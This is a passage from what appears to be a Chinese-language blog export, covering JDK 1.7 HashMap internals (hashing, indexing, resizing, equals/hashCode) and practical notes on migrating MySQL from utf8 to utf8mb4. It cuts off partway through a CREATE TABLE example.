class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        modCount++;<span class="comment">//保证并发访问时，若HashMap内部结构发生变化，快速响应失败</span></span><br><span class="line">        addEntry(hash, key, value, i);<span class="comment">//新增一个entry</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>inflateTable这个方法用于为主干数组table在内存中分配存储空间，通过roundUpToPowerOf2(toSize)可以确保capacity为大于或等于toSize的最接近toSize的二次幂，比如toSize&#x3D;13,则capacity&#x3D;16;to_size&#x3D;16,capacity&#x3D;16;to_size&#x3D;17,capacity&#x3D;32.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inflateTable</span><span class="params">(<span class="type">int</span> toSize)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> roundUpToPowerOf2(toSize);<span class="comment">//capacity一定是2的次幂</span></span><br><span class="line">        <span class="comment">/**此处为threshold赋值，取capacity*loadFactor和MAXIMUM_CAPACITY+1的最小值，</span></span><br><span class="line"><span class="comment">        capaticy一定不会超过MAXIMUM_CAPACITY，除非loadFactor大于1 */</span></span><br><span class="line">        threshold = (<span class="type">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>[capacity];</span><br><span class="line">        initHashSeedAsNeeded(capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>roundUpToPowerOf2中的这段处理使得数组长度一定为2的次幂，Integer.highestOneBit是用来获取最左边的bit（其他bit位为0）所代表的数值.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">roundUpToPowerOf2</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">       <span class="comment">// assert number &gt;= 0 : &quot;number must be non-negative&quot;;</span></span><br><span class="line">       <span class="keyword">return</span> number &gt;= MAXIMUM_CAPACITY</span><br><span class="line">               ? MAXIMUM_CAPACITY</span><br><span class="line">               : (number &gt; <span class="number">1</span>) ? Integer.highestOneBit((number - <span class="number">1</span>) &lt;&lt; <span class="number">1</span>) : <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hash函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**这是一个神奇的函数，用了很多的异或，移位等运算</span></span><br><span class="line"><span class="comment">对key的hashcode进一步进行计算以及二进制位的调整等来保证最终获取的存储位置尽量分布均匀*/</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">        h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上hash函数计算出的值，通过indexFor进一步处理来获取实际的存储位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回数组下标</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">indexFor</span><span class="params">(<span class="type">int</span> h, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> h &amp; (length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>h&amp;（length-1）保证获取的index一定在数组范围内，举个例子，默认容量16，length-1&#x3D;15，h&#x3D;18,转换成二进制计算为index&#x3D;2。位运算对计算机来说，性能更高一些（HashMap中有大量位运算）</p>
<p>所以最终存储位置的确定流程是这样的。HashMap如何确定元素位置。</p>
<p><img src="/images/2020/20181102214046362.png"></p>
<p>再来看看addEntry的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addEntry</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">int</span> bucketIndex)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((size &gt;= threshold) &amp;&amp; (<span class="literal">null</span> != table[bucketIndex])) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * table.length);<span class="comment">//当size超过临界阈值threshold，并且即将发生哈希冲突时进行扩容</span></span><br><span class="line">            hash = (<span class="literal">null</span> != key) ? hash(key) : <span class="number">0</span>;</span><br><span class="line">            bucketIndex = indexFor(hash, table.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        createEntry(hash, key, value, bucketIndex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过以上代码能够得知，<strong>当发生哈希冲突并且size大于阈值的时候，需要进行数组扩容，扩容时，需要新建一个长度为之前数组2倍的新的数组，然后将当前的Entry数组中的元素全部传输过去，扩容后的新数组长度为之前的2倍，所以扩容相对来说是个耗资源的操作。</strong></p>
<p><strong>三、为何HashMap的数组长度一定是2的次幂？</strong></p>
<p>我们来继续看上面提到的resize方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">resize</span><span class="params">(<span class="type">int</span> newCapacity)</span> &#123;</span><br><span class="line">        Entry[] oldTable = table;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> oldTable.length;</span><br><span class="line">        <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Entry[] newTable = <span class="keyword">new</span> <span class="title class_">Entry</span>[newCapacity];</span><br><span class="line">        transfer(newTable, initHashSeedAsNeeded(newCapacity));</span><br><span class="line">        table = newTable;</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果数组进行扩容，数组长度发生变化，而存储位置 index &#x3D; h&amp;(length-1),index也可能会发生变化，需要重新计算index，我们先来看看transfer这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">transfer</span><span class="params">(Entry[] newTable, <span class="type">boolean</span> rehash)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> newTable.length;</span><br><span class="line">　　　　　<span class="comment">//for循环中的代码，逐个遍历链表，重新计算索引位置，将老数组数据复制到新数组中去（数组不存储实际数据，所以仅仅是拷贝引用而已）</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e : table) &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">null</span> != e) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; next = e.next;</span><br><span class="line">                <span class="keyword">if</span> (rehash) &#123;</span><br><span class="line">                    e.hash = <span class="literal">null</span> == e.key ? <span class="number">0</span> : hash(e.key);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(e.hash, newCapacity);</span><br><span class="line">                <span class="comment">//将当前entry的next链指向新的索引位置,newTable[i]有可能为空，有可能也是个entry链，如果是entry链，直接在链表头部插入。</span></span><br><span class="line">                e.next = newTable[i];</span><br><span class="line">                newTable[i] = e;</span><br><span class="line">                e = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个方法将老数组中的数据逐个链表地遍历，扔到新的扩容后的数组中，我们的数组索引位置的计算是通过 对key值的hashcode进行hash扰乱运算后，再通过和 length-1进行位运算得到最终数组索引位置。</p>
<p>HashMap的数组长度一定保持2的次幂，比如16的二进制表示为 10000，那么length-1就是15，二进制为01111，同理扩容后的数组长度为32，二进制表示为100000，length-1为31，二进制表示为011111。从下图可以我们也能看到这样会保证低位全为1，而扩容后只有一位差异，也就是多出了最左位的1，这样在通过 h&amp;(length-1)的时候，只要h对应的最左边的那一个差异位为0，就能保证得到的新的数组索引和老数组索引一致(大大减少了之前已经散列良好的老数组的数据位置重新调换)，个人理解。</p>
<p><img src="/images/2020/20181102223343298.png"></p>
<p>还有，数组长度保持2的次幂，length-1的低位都为1，会使得获得的数组索引index更加均匀</p>
<p><img src="/images/2020/20181102223421180.png"></p>
<p>我们看到，上面的&amp;运算，高位是不会对结果产生影响的（hash函数采用各种位运算可能也是为了使得低位更加散列），我们只关注低位bit，如果低位全部为1，那么对于h低位部分来说，任何一位的变化都会对结果产生影响，也就是说，要得到index&#x3D;21这个存储位置，h的低位只有这一种组合。这也是数组长度设计为必须为2的次幂的原因。</p>
<p><img src="/images/2020/2018110222343145.png"></p>
<p>如果不是2的次幂，也就是低位不是全为1此时，要使得index&#x3D;21，h的低位部分不再具有唯一性了，哈希冲突的几率会变的更大，同时，index对应的这个bit位无论如何不会等于1了，而对应的那些数组位置也就被白白浪费了。</p>
<p><strong>get方法</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">　　　　 <span class="comment">//如果key为null,则直接去table[0]处去检索即可。</span></span><br><span class="line">       <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> getForNullKey();</span><br><span class="line">       Entry&lt;K,V&gt; entry = getEntry(key);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span> == entry ? <span class="literal">null</span> : entry.getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>get方法通过key值返回对应value，如果key为null，直接去table[0]处检索。我们再看一下getEntry这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Entry&lt;K,V&gt; <span class="title function_">getEntry</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//通过key的hashcode值计算hash值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : hash(key);</span><br><span class="line">        <span class="comment">//indexFor (hash&amp;length-1) 获取最终数组索引，然后遍历链表，通过equals方法比对找出对应记录</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];</span><br><span class="line">             e != <span class="literal">null</span>;</span><br><span class="line">             e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; </span><br><span class="line">                ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                <span class="keyword">return</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出，get方法的实现相对简单，key(hashcode)–&gt;hash–&gt;indexFor–&gt;最终索引位置，找到对应位置table[i]，再查看是否有链表，遍历链表，通过key的equals方法比对查找对应的记录。要注意的是，有人觉得上面在定位到数组位置之后然后遍历链表的时候，e.hash &#x3D;&#x3D; hash这个判断没必要，仅通过equals判断就可以。其实不然，试想一下，如果传入的key对象重写了equals方法却没有重写hashCode，而恰巧此对象定位到这个数组位置，如果仅仅用equals判断可能是相等的，但其hashCode和当前对象不一致，这种情况，根据Object的hashCode的约定，不能返回当前对象，而应该返回null，后面的例子会做出进一步解释。</p>
<p><strong>四、重写equals方法需同时重写hashCode方法</strong></p>
<p>最后我们再聊聊老生常谈的一个问题，各种资料上都会提到，“重写equals时也要同时覆盖hashcode”，我们举个小例子来看看，如果重写了equals而不重写hashcode会发生什么样的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="type">int</span> idCard;</span><br><span class="line">        String name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> idCard, String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.idCard = idCard;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> == o) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) o;</span><br><span class="line">            <span class="comment">//两个对象是否等值，通过idCard来确定</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.idCard == person.idCard;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span>&#123;</span><br><span class="line">        HashMap&lt;Person,String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Person, String&gt;();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1234</span>,<span class="string">&quot;乔峰&quot;</span>);</span><br><span class="line">        <span class="comment">//put到hashmap中去</span></span><br><span class="line">        map.put(person,<span class="string">&quot;天龙八部&quot;</span>);</span><br><span class="line">        <span class="comment">//get取出，从逻辑上讲应该能输出“天龙八部”</span></span><br><span class="line">        System.out.println(<span class="string">&quot;结果:&quot;</span>+map.get(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1234</span>,<span class="string">&quot;萧峰&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">实际输出结果：<span class="literal">null</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果我们已经对HashMap的原理有了一定了解，这个结果就不难理解了。尽管我们在进行get和put操作的时候，使用的key从逻辑上讲是等值的（通过equals比较是相等的），但由于没有重写hashCode方法，所以put操作时，key(hashcode1)–&gt;hash–&gt;indexFor–&gt;最终索引位置 ，而通过key取出value的时候 key(hashcode1)–&gt;hash–&gt;indexFor–&gt;最终索引位置，由于hashcode1不等于hashcode2，导致没有定位到一个数组位置而返回逻辑上错误的值null（也有可能碰巧定位到一个数组位置，但是也会判断其entry的hash值是否相等，上面get方法中有提到。）</p>
<p>所以，在重写equals的方法的时候，必须注意重写hashCode方法，同时还要保证通过equals判断相等的两个对象，调用hashCode方法要返回同样的整数值。而如果equals判断不相等的两个对象，其hashCode可以相同（只不过会发生哈希冲突，应尽量避免）。</p>
<p><strong>五、JDK1.8中HashMap的性能优化</strong></p>
<p>假如一个数组槽位上链上数据过多（即拉链过长的情况）导致性能下降该怎么办？<br>JDK1.8在JDK1.7的基础上针对增加了红黑树来进行优化。即当链表超过8时，链表就转换为红黑树，利用红黑树快速增删改查的特点提高HashMap的性能，其中会用到红黑树的插入、删除、查找等算法。<br>关于这方面的探讨我们以后的文章再做说明。<br><strong>附：HashMap put方法逻辑图（JDK1.8）</strong>  </p>
<p><img src="/images/2020/20181105181728652.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql 使用 utf8mb4 经验</title>
    <url>/2020/11/mysql-utf8mb4/</url>
    <content><![CDATA[<h2 id="1-utf8-与-utf8mb4-异同"><a href="#1-utf8-与-utf8mb4-异同" class="headerlink" title="1. utf8 与 utf8mb4 异同"></a>1. utf8 与 utf8mb4 异同</h2><p>先看 官方手册 <span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2RvYy9yZWZtYW4vNS42L2VuL2NoYXJzZXQtdW5pY29kZS11dGY4bWI0Lmh0bWw=">https://dev.mysql.com/doc/refman/5.6/en/charset-unicode-utf8mb4.html<i class="fa fa-external-link-alt"></i></span> 的说明</p>
<span id="more"></span>

<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">The <span class="keyword">character</span> <span class="built_in">set</span> named utf8 uses <span class="keyword">a</span> maximum <span class="keyword">of</span> <span class="literal">three</span> <span class="keyword">bytes</span> per <span class="keyword">character</span> <span class="keyword">and</span> <span class="keyword">contains</span> only BMP <span class="keyword">characters</span>. The utf8mb4 <span class="keyword">character</span> <span class="built_in">set</span> uses <span class="keyword">a</span> maximum <span class="keyword">of</span> <span class="literal">four</span> <span class="keyword">bytes</span> per <span class="keyword">character</span> supports supplementary <span class="keyword">characters</span>:</span><br><span class="line"></span><br><span class="line">For <span class="keyword">a</span> BMP <span class="keyword">character</span>, utf8 <span class="keyword">and</span> utf8mb4 have identical storage characteristics: same code values, same encoding, same <span class="built_in">length</span>.</span><br><span class="line">For <span class="keyword">a</span> supplementary <span class="keyword">character</span>, utf8 cannot store <span class="keyword">the</span> <span class="keyword">character</span> <span class="keyword">at</span> all, whereas utf8mb4 requires <span class="literal">four</span> <span class="keyword">bytes</span> <span class="built_in">to</span> store <span class="keyword">it</span>. Because utf8 cannot store <span class="keyword">the</span> <span class="keyword">character</span> <span class="keyword">at</span> all, you have no supplementary <span class="keyword">characters</span> <span class="keyword">in</span> utf8 columns <span class="keyword">and</span> need <span class="keyword">not</span> worry about converting <span class="keyword">characters</span> <span class="keyword">or</span> losing data when upgrading utf8 data <span class="built_in">from</span> older versions <span class="keyword">of</span> MySQL.</span><br></pre></td></tr></table></figure>

<p>MySQL在 5.5.3 之后增加了 utf8mb4 字符编码，mb4即 most bytes 4。简单说 utf8mb4 是 utf8 的超集并完全兼容utf8，能够用四个字节存储更多的字符。</p>
<p>但抛开数据库，标准的 UTF-8 字符集编码是可以用 1~4 个字节去编码21位字符，这几乎包含了是世界上所有能看见的语言了。然而在MySQL里实现的utf8最长使用3个字节，也就是只支持到了 Unicode 中的 基本多文本平面（U 0000至U FFFF），包含了控制符、拉丁文，中、日、韩等绝大多数国际字符，但并不是所有，最常见的就算现在手机端常用的表情字符 emoji和一些不常用的汉字，如 “墅” ，这些需要四个字节才能编码出来。</p>
<p>注：QQ里面的内置的表情不算，它是通过特殊映射到的一个gif图片。一般输入法自带的就是。</p>
<p>也就是当你的数据库里要求能够存入这些表情或宽字符时，可以把字段定义为 utf8mb4，同时要注意连接字符集也要设置为utf8mb4，否则在 严格模式 下会出现 Incorrect string value: &#x2F;xF0&#x2F;xA1&#x2F;x8B&#x2F;xBE&#x2F;xE5&#x2F;xA2… for column ‘name’这样的错误，非严格模式下此后的数据会被截断。</p>
<p>提示：另外一种能够存储emoji的方式是，不关心数据库表字符集，只要连接字符集使用 latin1，但相信我，你绝对不想这个干，一是这种字符集混用管理极不规范，二是存储空间被放大（读者可以想下为什么）。</p>
<h2 id="2-utf8mb4unicodeci-与-utf8mb4generalci-如何选择"><a href="#2-utf8mb4unicodeci-与-utf8mb4generalci-如何选择" class="headerlink" title="2. utf8mb4unicodeci 与 utf8mb4generalci 如何选择"></a>2. utf8mb4unicodeci 与 utf8mb4generalci 如何选择</h2><p>字符除了需要存储，还需要排序或比较大小，涉及到与编码字符集对应的 排序字符集（collation）。ut8mb4对应的排序字符集常用的有 utf8mb4_unicode_ci、utf8mb4_general_ci，到底采用哪个在 stackoverflow 上有个讨论，What’s the difference between utf8_general_ci and utf8_unicode_ci</p>
<p>主要从排序准确性和性能两方面看：</p>
<pre><code>准确性
    utf8mb4_unicode_ci 是基于标准的Unicode来排序和比较，能够在各种语言之间精确排序
    utf8mb4_general_ci 没有实现Unicode排序规则，在遇到某些特殊语言或字符是，排序结果可能不是所期望的。
    但是在绝大多数情况下，这种特殊字符的顺序一定要那么精确吗。比如Unicode把ß、Œ当成ss和OE来看；而general会把它们当成s、e，再如ÀÁÅåāă各自都与 A 相等。

性能
    utf8mb4_general_ci 在比较和排序的时候更快
    utf8mb4_unicode_ci 在特殊情况下，Unicode排序规则为了能够处理特殊字符的情况，实现了略微复杂的排序算法。
    但是在绝大多数情况下，不会发生此类复杂比较。general理论上比Unicode可能快些，但相比现在的CPU来说，它远远不足以成为考虑性能的因素，索引涉及、SQL设计才是。 我个人推荐是 utf8mb4_unicode_ci，将来 8.0 里也极有可能使用变为默认的规则。相比选择哪一种collation，使用者应该更关心字符集与排序规则在db里要统一就好。
    这也从另一个角度告诉我们，不要可能产生乱码的字段作为主键或唯一索引。我遇到过一例，以 url 来作为唯一索引，但是它记录的有可能是乱码，导致后来想把它们修复就特别麻烦。
</code></pre>
<h2 id="3-怎么从utf8转换为utf8mb4"><a href="#3-怎么从utf8转换为utf8mb4" class="headerlink" title="3. 怎么从utf8转换为utf8mb4"></a>3. 怎么从utf8转换为utf8mb4</h2><h4 id="3-1-“伪”转换"><a href="#3-1-“伪”转换" class="headerlink" title="3.1 “伪”转换"></a>3.1 “伪”转换</h4><p>如果你的表定义和连接字符集都是utf8，那么直接在你的表上执行</p>
<pre><code>ALTER TABLE tbl_name CONVERT TO CHARACTER SET utf8mb4;
</code></pre>
<p>则能够该表上所有的列的character类型变成 utf8mb4，表定义的默认字符集也会修改。连接的时候需要使用set names utf8mb4便可以插入四字节字符。（如果依然使用 utf8 连接，只要不出现四字节字符则完全没问题）。</p>
<p>上面的 convert 有两个问题，一是它不能ONLINE，也就是执行之后全表禁止修改，有关这方面的讨论见 mysql 5.6 原生Online DDL解析；二是，它可能会自动该表字段类型定义，如 VARCHAR 被转成 MEDIUMTEXT，可以通过 MODIFY 指定类型为原类型。</p>
<p>另外 ALTER TABLE tbl_name DEFAULT CHARACTER SET utf8mb4 这样的语句就不要随便执行了，特别是当表原本不是utf8时，除非表是空的或者你确认表里只有拉丁字符，否则正常和乱的就混在一起了。</p>
<p>最重要的是，你连接时使用的latin1字符集写入了历史数据，表定义是latin1或utf8，不要期望通过 ALTER … CONVERT … 能够让你达到用utf8读取历史中文数据的目的，没卵用，老老实实做逻辑dump。所以我才叫它“伪”转换</p>
<h4 id="3-2-character-set-server"><a href="#3-2-character-set-server" class="headerlink" title="3.2 character-set-server"></a>3.2 character-set-server</h4><p>一旦你决定使用utf8mb4，强烈建议你要修改服务端 character-set-server&#x3D;utf8mb4，不同的语言对它的处理方法不一样，c , php, python可以设置character-set，但java驱动依赖于 character-set-server 选项，后面有介绍。</p>
<p>同时还要谨慎一些特殊选项，如 遇到腾讯云CDB连接字符集设置一个坑。个人不建议设置全局 init_connect。</p>
<h2 id="4-key-768-long-错误"><a href="#4-key-768-long-错误" class="headerlink" title="4. key 768 long 错误"></a>4. key 768 long 错误</h2><p>字符集从utf8转到utf8mb4之后，最容易引起的就是索引键超长的问题。</p>
<p>对于表行格式是 COMPACT或 REDUNDANT，InnoDB有单个索引最大字节数 768 的限制，而字段定义的是能存储的字符数，比如 VARCHAR(200) 代表能够存200个汉字，索引定义是字符集类型最大长度算的，即 utf8 maxbytes&#x3D;3, utf8mb4 maxbytes&#x3D;4，算下来utf8和utf8mb4两种情况的索引长度分别为600 bytes和800bytes，后者超过了768，导致出错：Error 1071: Specified key was too long; max key length is 767 bytes。</p>
<p>COMPRESSED和DYNAMIC格式不受限制，但也依然不建议索引太长，太浪费空间和cpu搜索资源。</p>
<p>如果已有定义超过这个长度的，可加上前缀索引，如果暂不能加上前缀索引（像唯一索引），可把该字段的字符集改回utf8或latin1。但是，（ 敲黑板啦，很重要 ），要防止出现 Illegal mix of collations (utf8_general_ci,IMPLICIT) and (utf8mb4_general_ci,COERCIBLE) for operation ‘&#x3D;’ 错误：连接字符集使用utf8mb4，但 SELECT&#x2F;UPDATE where条件有utf8类型的列，且条件右边存在不属于utf8字符，就会触发该异常。表示踩过这个坑。</p>
<p>再多加一个友好提示：EXPLAIN 结果里面的 keylen 指的搜索索引长度，单位是bytes，而且是以字符集支持的单字符最大字节数算的，这也是为什么 INDEXLENGTH 膨胀厉害的一个原因。</p>
<h2 id="5-C-C-内存空间分配问题"><a href="#5-C-C-内存空间分配问题" class="headerlink" title="5. C&#x2F;C 内存空间分配问题"></a>5. C&#x2F;C 内存空间分配问题</h2><p>这是我们这边的开发遇到的一个棘手的问题。C或C 连接MySQL使用的是linux系统上的 libmysqlclient 动态库，程序获取到数据之后根据自定义的一个网络协议，按照mysql字段定义的固定字节数来传输数据。从utf8转utf8mb4之后，c 里面针对character单字符内存空间分配，从3个增加到4个，引起异常。</p>
<p>这个问题其实是想说明，使用utf8mb4之后，官方建议尽量用 varchar 代替 char，这样可以减少固定存储空间浪费（关于char与varchar的选择，可参考 这里）。但开发设计表时 varchar 的大小不能随意加大，它虽然是变长的，但客户端在定义变量来获取数据时，是以定义的为准，而非实际长度。按需分配，避免程序使用过多的内存。</p>
<h2 id="6-java驱动使用"><a href="#6-java驱动使用" class="headerlink" title="6. java驱动使用"></a>6. java驱动使用</h2><p>Java语言里面所实现的UTF-8编码就是支持4字节的，所以不需要配置 mb4 这样的字眼，但如果从MySQL读写emoji，MySQL驱动版本要在 5.1.13 及以上版本，数据库连接依然是 characterEncoding&#x3D;UTF-8 。</p>
<p>但还没完，遇到一个大坑。官方手册 里还有这么一段话：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Connector/J did <span class="keyword">not</span> support utf8mb4 <span class="keyword">for</span> servers <span class="number">5.5</span><span class="number">.2</span> <span class="keyword">and</span> newer.</span><br><span class="line"></span><br><span class="line">Connector/J now auto-detects servers configured <span class="keyword">with</span> character_set_server=utf8mb4 <span class="keyword">or</span> treats <span class="keyword">the</span> Java encoding utf<span class="number">-8</span> passed</span><br><span class="line">  <span class="keyword">using</span> characterEncoding=... <span class="keyword">as</span> utf8mb4 <span class="keyword">in</span> <span class="keyword">the</span> SET NAMES= calls <span class="keyword">it</span> makes when establishing <span class="keyword">the</span> connection. (Bug <span class="comment">#54175)</span></span><br></pre></td></tr></table></figure>
<p>意思是，java驱动会自动检测服务端 character_set_server 的配置，如果为utf8mb4，驱动在建立连接的时候设置 SET NAMES utf8mb4。然而其他语言没有依赖于这样的特性。</p>
<h2 id="7-主从复制报错"><a href="#7-主从复制报错" class="headerlink" title="7. 主从复制报错"></a>7. 主从复制报错</h2><p>这个问题没有遇到，只是看官方文档有提到，曾经也看到过类似的技术文章。大概就是从库的版本比主库的版本低，导致有些字符集不支持；或者人工修改了从库上的表或字段的字符集定义，都有可能引起异常。</p>
<h2 id="8-join-查询问题"><a href="#8-join-查询问题" class="headerlink" title="8. join 查询问题"></a>8. join 查询问题</h2><p>有资料说 MySQL 表字段字符集不同导致的索引失效问题，自己也验证了一下，的确会有问题：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TABLE <span class="symbol">`t1`</span> (</span><br><span class="line"><span class="symbol">`id`</span> int(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line"><span class="symbol">`name`</span> varchar(<span class="number">20</span>) DEFAULT <span class="literal">NULL</span>,</span><br><span class="line"><span class="symbol">`code`</span> varchar(<span class="number">50</span>) DEFAULT <span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> (<span class="symbol">`id`</span>),</span><br><span class="line"><span class="keyword">KEY</span> <span class="symbol">`idx_code`</span> (<span class="symbol">`code`</span>),</span><br><span class="line"><span class="keyword">KEY</span> <span class="symbol">`idx_name`</span> (<span class="symbol">`name`</span>)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=<span class="number">6</span> 